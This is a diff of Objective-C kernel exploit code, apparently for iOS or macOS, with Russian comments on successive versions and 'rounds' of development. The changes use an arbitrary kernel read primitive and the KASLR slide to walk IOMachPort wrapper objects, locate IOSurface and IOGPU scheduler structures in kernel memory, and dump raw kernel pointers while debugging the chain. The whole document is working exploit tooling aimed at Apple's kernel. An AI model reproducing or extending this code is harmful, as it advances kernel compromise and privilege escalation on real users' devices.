@@ -5914,22 +5914,35 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             return kpLooksLikeKernelPointer(kobj) ? kobj : (uint64_t)0;
         };
         uint64_t (^surfFromSendRight)(uint64_t) = ^uint64_t(uint64_t kobj) {
+            // 1.9.149: kobj = IOMachPort (обёртка порта, раунд 29) — реальный
+            // объект за [+0x28]. Два уровня: поля kobj → c (SendRight/UC),
+            // поля c → c2 (IOSurface). Верификация surfFast (pfn-цепочка).
             if (surfFull(kobj)) return kobj;
             for (uint32_t o = 0; o < 0x100; o += 8) {
                 uint64_t c = kp_untag_ptr(early_kread64(kobj + o));
                 if (surfFast(c)) return c;
+                if (!kpLooksLikeKernelPointer(c)) continue;
+                for (uint32_t o2 = 0; o2 + 8 <= 0x30; o2 += 8) {
+                    uint64_t c2 = kp_untag_ptr(early_kread64(c + o2));
+                    if (surfFast(c2)) return c2;
+                }
             }
             return (uint64_t)0;
         };
         uint64_t (^surfFromUC)(uint64_t) = ^uint64_t(uint64_t uc) {
-            uint64_t coll = kp_untag_ptr(early_kread64(uc + 0xe8));
-            if (!kpLooksLikeKernelPointer(coll)) return (uint64_t)0;
-            uint64_t cnt2 = early_kread64(coll + 0xd8);
-            uint64_t arr2 = kp_untag_ptr(early_kread64(coll + 0xd0));
-            if (!kpLooksLikeKernelPointer(arr2) || cnt2 <= dstID || cnt2 >= 0x200000) return (uint64_t)0;
-            uint64_t cand = kp_untag_ptr(early_kread64(arr2 + (uint64_t)dstID * 8));
-            if (!surfFull(cand)) return (uint64_t)0;
-            return cand;
+            for (uint32_t hop = 0; hop < 2; hop++) {
+                uint64_t base = hop ? kp_untag_ptr(early_kread64(uc + 0x28)) : uc;
+                if (!kpLooksLikeKernelPointer(base)) continue;
+                uint64_t coll = kp_untag_ptr(early_kread64(base + 0xe8));
+                if (!kpLooksLikeKernelPointer(coll)) continue;
+                uint64_t cnt2 = early_kread64(coll + 0xd8);
+                uint64_t arr2 = kp_untag_ptr(early_kread64(coll + 0xd0));
+                if (!kpLooksLikeKernelPointer(arr2) || cnt2 <= dstID || cnt2 >= 0x200000) continue;
+                uint64_t cand = kp_untag_ptr(early_kread64(arr2 + (uint64_t)dstID * 8));
+                if (!surfFull(cand)) continue;
+                return cand;
+            }
+            return (uint64_t)0;
         };
         // smp: сырцовый дамп kobj — понять, почему 1.9.143 не нашла SendRight-поле
         typedef mach_port_t (*CreateMachPort_t)(IOSurfaceRef);
@@ -5943,7 +5956,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                   smp, (unsigned long long)smpKobj, (unsigned long long)smpVt,
                   (unsigned long long)(smpVt ? smpVt - kslide : 0), (unsigned long long)vtSendRight]);
         if (smpKobj) {
-            for (uint32_t o = 0; o < 0x28; o += 8) {
+            for (uint32_t o = 0; o + 8 <= 0x38; o += 8) {
                 uint64_t q = early_kread64(smpKobj + o);
                 uint64_t u = kp_untag_ptr(q);
                 kpNote(r, [NSString stringWithFormat:@"    kobj+0x%02x: raw=%#018llx untag=%#018llx%@",
@@ -5951,8 +5964,25 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                           kpLooksLikeKernelPointer(u)
                             ? [NSString stringWithFormat:@" → [+0x10]=%#x surfFast=%d", (uint32_t)early_kread64(u + 0x10), (int)surfFast(u)] : @""]);
             }
+            // раунд 29: kobj = IOMachPort (обёртка), реальный sub-object за +0x28
+            uint64_t hop = kp_untag_ptr(early_kread64(smpKobj + 0x28));
+            uint64_t hopVt = kpLooksLikeKernelPointer(hop) ? kp_untag_ptr(early_kread64(hop)) : 0;
+            kpNote(r, [NSString stringWithFormat:@"    IOMachPort+0x28 → %#llx vt=%#llx (file %#llx%@)",
+                      (unsigned long long)hop, (unsigned long long)hopVt,
+                      (unsigned long long)(hopVt ? hopVt - kslide : 0),
+                      hopVt == vtSendRight ? @" = SendRight!" : @""]);
+            if (kpLooksLikeKernelPointer(hop)) {
+                for (uint32_t o = 0; o + 8 <= 0x30; o += 8) {
+                    uint64_t q = early_kread64(hop + o);
+                    uint64_t u = kp_untag_ptr(q);
+                    kpNote(r, [NSString stringWithFormat:@"    hop+0x%02x: raw=%#018llx untag=%#018llx%@",
+                              o, (unsigned long long)q, (unsigned long long)u,
+                              kpLooksLikeKernelPointer(u)
+                                ? [NSString stringWithFormat:@" → [+0x10]=%#x surfFast=%d", (uint32_t)early_kread64(u + 0x10), (int)surfFast(u)] : @""]);
+                }
+            }
             surfVA = surfFromSendRight(smpKobj);
-            if (surfVA) kpNote(r, [NSString stringWithFormat:@"  ★ smp SendRight → IOSurface %#llx", (unsigned long long)surfVA]);
+            if (surfVA) kpNote(r, [NSString stringWithFormat:@"  ★ smp IOMachPort-хоп → IOSurface %#llx", (unsigned long long)surfVA]);
         }
         // enum всех портов задачи: перепись + оба экстрактора до первого хита
         if (!surfVA) {
@@ -6084,14 +6114,18 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             return c;
         };
         if (vcVA) {
-            uint64_t obj = kp_untag_ptr(early_kread64(vcVA + 0xe8));
+            // 1.9.149: vcVA = IOMachPort-обёртка (раунд 29) — реальный клиент за
+            // [+0x28]. 1.9.148 искал scheduler внутри обёртки → scheduler=0.
+            uint64_t vcReal = kp_untag_ptr(early_kread64(vcVA + 0x28));
+            if (!kpLooksLikeKernelPointer(vcReal)) vcReal = vcVA;
+            uint64_t obj = kp_untag_ptr(early_kread64(vcReal + 0xe8));
             schedVA = schedIfLayout(kp_untag_ptr(early_kread64(obj + 0xb8)));
             if (!schedVA) schedVA = schedIfLayout(obj);
             uint64_t cand[32];
             uint32_t cn = 0;
             if (!schedVA) {
                 for (uint32_t o = 0; o + 8 <= 0x168 && cn < 32; o += 8) {
-                    uint64_t p = kp_untag_ptr(early_kread64(vcVA + o));
+                    uint64_t p = kp_untag_ptr(early_kread64(vcReal + o));
                     if (!kpLooksLikeKernelPointer(p)) continue;
                     BOOL dup = NO;
                     for (uint32_t k = 0; k < cn; k++) if (cand[k] == p) { dup = YES; break; }
@@ -6106,8 +6140,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     }
                 }
             }
-            kpNote(r, [NSString stringWithFormat:@"  op-entry oracle: clientVA=%#llx obj(+0xe8)=%#llx scheduler=%#llx (кандидатов=%u)",
-                      (unsigned long long)vcVA, (unsigned long long)obj, (unsigned long long)schedVA, cn]);
+            kpNote(r, [NSString stringWithFormat:@"  op-entry oracle: clientVA=%#llx real(+0x28)=%#llx obj(+0xe8)=%#llx scheduler=%#llx (кандидатов=%u)",
+                      (unsigned long long)vcVA, (unsigned long long)vcReal, (unsigned long long)obj, (unsigned long long)schedVA, cn]);
         }
         if (schedVA) {
             uint64_t cnt = early_kread64(schedVA + 0xb8);
